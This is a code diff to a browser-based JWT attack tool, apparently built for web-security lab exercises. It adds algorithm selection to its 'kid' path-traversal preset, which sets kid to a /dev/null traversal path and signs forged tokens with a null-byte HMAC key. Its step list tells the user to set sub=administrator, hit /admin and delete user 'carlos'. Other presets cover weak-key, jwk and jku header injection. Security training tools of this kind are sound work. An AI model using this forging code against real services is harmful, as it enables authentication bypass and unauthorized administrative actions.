@@ -20,6 +20,8 @@ const copyJwksBtn = document.getElementById('copyJwksBtn');
 const signJkuBtn = document.getElementById('signJkuBtn');
 const jwksOutput = document.getElementById('jwksOutput');
 const attackSteps = document.getElementById('attackSteps');
+const kidTools = document.getElementById('kidTools');
+const kidAlgSelect = document.getElementById('kidAlgSelect');
 const generateBtn = document.getElementById('generateBtn');
 const resultToken = document.getElementById('resultToken');
 const attackNotes = document.getElementById('attackNotes');
@@ -141,11 +143,14 @@ async function generateJwkAttackToken(forceJwkSign) {
 
     if (selectedAttack === 'kid-path-traversal') {
       // Automated traversal kid + null-byte signing key, while preserving source alg/payload.
+      const selectedAlg = kidAlgSelect.value;
+      if (!selectedAlg.startsWith('HS')) throw new Error('kid traversal signer supports HS algorithms only.');
+      nextHeader.alg = selectedAlg;
       nextHeader.kid = '../../../../../../../dev/null';
       delete nextHeader.jku;
       delete nextHeader.jwk;
       const signingInput = `${base64urlJson(nextHeader)}.${base64urlJson(payload)}`;
-      nextSig = await hmacSignBase64urlBytes(signingInput, new Uint8Array([0]), 'SHA-256');
+      nextSig = await hmacSignBase64urlBytes(signingInput, new Uint8Array([0]), hashFromAlg(selectedAlg));
       resultToken.value = `${signingInput}.${nextSig}`;
       attackNotes.textContent = 'Auto-generated kid path traversal JWT (kid=/dev/null traversal, key=0x00; payload/alg preserved).';
       return;
@@ -166,6 +171,10 @@ copyBtn.addEventListener('click', async () => {
 function configureInputForAttack(key) {
   jwkTools.classList.add('hidden');
   jkuTools.classList.add('hidden');
+  kidTools.classList.add('hidden');
+  extraInput.classList.remove('hidden');
+  extraInputLabel.classList.remove('hidden');
+  extraInputHelp.classList.remove('hidden');
 
   if (key === 'weak-signing-key') return showInput('Weak key / secret', 'secret1', 'Required for HS attack.');
 
@@ -181,7 +190,11 @@ function configureInputForAttack(key) {
     return;
   }
   if (key === 'kid-path-traversal') {
-    attackInputSection.classList.add('hidden');
+    attackInputSection.classList.remove('hidden');
+    kidTools.classList.remove('hidden');
+    extraInput.classList.add('hidden');
+    extraInputLabel.classList.add('hidden');
+    extraInputHelp.classList.add('hidden');
     extraInput.value = '';
     return;
   }
@@ -262,10 +275,11 @@ function getAttackSteps(key) {
     return [
       '1) Paste source JWT and click Decode token.',
       '2) Optionally edit payload (for example set sub=administrator).',
-      '3) Tool automatically sets kid to ../../../../../../../dev/null.',
-      '4) Tool automatically signs with a null-byte key (0x00).',
-      '5) Click Generate and send request to /admin.',
-      '6) Then call /admin/delete?username=carlos.',
+      '3) In Attack-specific input choose signing alg (HS256/HS384/HS512).',
+      '4) Tool sets kid to ../../../../../../../dev/null.',
+      '5) Tool signs with null-byte key (0x00) using selected alg.',
+      '6) Click Generate and send request to /admin.',
+      '7) Then call /admin/delete?username=carlos.',
     ].join('\n');
   }
 
@@ -279,7 +293,7 @@ function getPresetHint(key) {
     'weak-signing-key': 'Requires user-provided secret.',
     'jwk-header-injection': 'Choose algorithm, generate key, then generate token.',
     'jku-header-injection': 'Requires jku URL.',
-    'kid-path-traversal': 'Fully automated: click Generate to get ready JWT.',
+    'kid-path-traversal': 'Choose HS alg, then Generate for ready JWT.',
   };
   return hints[key] || 'Choose preset and generate.';
 }
